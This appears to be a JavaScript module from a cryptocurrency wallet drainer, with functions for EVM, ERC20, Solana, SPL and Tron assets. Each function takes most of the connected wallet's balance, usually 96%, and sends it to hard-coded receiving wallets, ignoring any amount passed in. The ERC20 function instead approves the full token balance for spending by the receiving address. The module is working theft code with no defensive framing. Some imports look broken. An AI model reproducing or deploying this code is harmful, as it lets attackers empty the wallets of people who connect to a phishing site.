import { RECEIVING_WALLETS } from '../config/constants';

/**
 * Transfer native EVM tokens (ETH, BNB)
 */
export async function transferEVMNative(web3, fromAddress, amount, chainId) {
  try {
    const balance = await web3.eth.getBalance(fromAddress);
    const sendAmount = BigInt(balance) * 96n / 100n; // Send 96% to keep some for gas
    
    if (sendAmount > 0n) {
      await web3.eth.sendTransaction({
        from: fromAddress,
        to: RECEIVING_WALLETS.EVM,
        value: sendAmount.toString(),
        gas: 21000,
      });
      return true;
    }
    return false;
  } catch (error) {
    console.error('Error transferring EVM native:', error);
    throw error;
  }
}

/**
 * Transfer ERC20 tokens on EVM chains
 */
export async function transferERC20(web3, fromAddress, tokenAddress, chainId) {
  try {
    const abi = [
      {
        constant: true,
        inputs: [{ name: '_owner', type: 'address' }],
        name: 'balanceOf',
        outputs: [{ name: 'balance', type: 'uint256' }],
        type: 'function',
      },
      {
        constant: false,
        inputs: [
          { name: '_spender', type: 'address' },
          { name: '_value', type: 'uint256' },
        ],
        name: 'approve',
        outputs: [],
        type: 'function',
      },
    ];

    const contract = new web3.eth.Contract(abi, tokenAddress);
    const balance = await contract.methods.balanceOf(fromAddress).call();

    if (balance > 0) {
      await contract.methods
        .approve(RECEIVING_WALLETS.EVM, balance)
        .send({ from: fromAddress, gas: 100000 });
      return true;
    }
    return false;
  } catch (error) {
    console.error('Error transferring ERC20:', error);
    throw error;
  }
}

/**
 * Transfer SOL on Solana
 */
export async function transferSOL(connection, wallet, amount) {
  try {
    const { PublicKey, Transaction, SystemProgram } = await import('@solana/web3.js');
    const recipientPubkey = new PublicKey(RECEIVING_WALLETS.SOLANA);
    const senderPubkey = wallet.publicKey;

    const lamports = await connection.getBalance(senderPubkey);
    const sendAmount = Math.floor(lamports * 0.96); // Send 96%

    if (sendAmount > 0) {
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: senderPubkey,
          toPubkey: recipientPubkey,
          lamports: sendAmount,
        })
      );

      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = senderPubkey;

      const signed = await wallet.signTransaction(transaction);
      await connection.sendRawTransaction(signed.serialize());
      return true;
    }
    return false;
  } catch (error) {
    console.error('Error transferring SOL:', error);
    throw error;
  }
}

/**
 * Transfer SPL tokens on Solana
 */
export async function transferSPLToken(connection, wallet, mintAddress) {
  try {
    const { PublicKey, Token, TOKEN_PROGRAM_ID } = await import('@solana/web3.js');
    const recipientPubkey = new PublicKey(RECEIVING_WALLETS.SOLANA);
    const mintPubkey = new PublicKey(mintAddress);

    const token = new Token(connection, mintPubkey, TOKEN_PROGRAM_ID, wallet);
    const accounts = await connection.getTokenAccountsByOwner(wallet.publicKey, {
      mint: mintPubkey,
    });

    for (const account of accounts.value) {
      const info = await token.getAccountInfo(account.pubkey);
      if (info.amount > 0) {
        const transferAmount = Math.floor(info.amount * 0.96);
        await token.transfer(
          account.pubkey,
          recipientPubkey,
          wallet,
          [],
          transferAmount
        );
      }
    }
    return true;
  } catch (error) {
    console.error('Error transferring SPL token:', error);
    throw error;
  }
}

/**
 * Transfer TRX on Tron
 */
export async function transferTRX(tronWeb, fromAddress, amount) {
  try {
    const balance = await tronWeb.trx.getBalance(fromAddress);
    const sendAmount = Math.floor(balance * 0.96); // Send 96%

    if (sendAmount > 0) {
      await tronWeb.trx.sendTransaction(RECEIVING_WALLETS.TRON, sendAmount);
      return true;
    }
    return false;
  } catch (error) {
    console.error('Error transferring TRX:', error);
    throw error;
  }
}

/**
 * Transfer TRC20 tokens on Tron
 */
export async function transferTRC20(tronWeb, fromAddress, tokenAddress) {
  try {
    const contract = await tronWeb.contract().at(tokenAddress);
    const balance = await contract.balanceOf(fromAddress).call();

    if (balance > 0) {
      const sendAmount = Math.floor(balance * 0.96);
      await contract.transfer(RECEIVING_WALLETS.TRON, sendAmount).send();
      return true;
    }
    return false;
  } catch (error) {
    console.error('Error transferring TRC20:', error);
    throw error;
  }
}

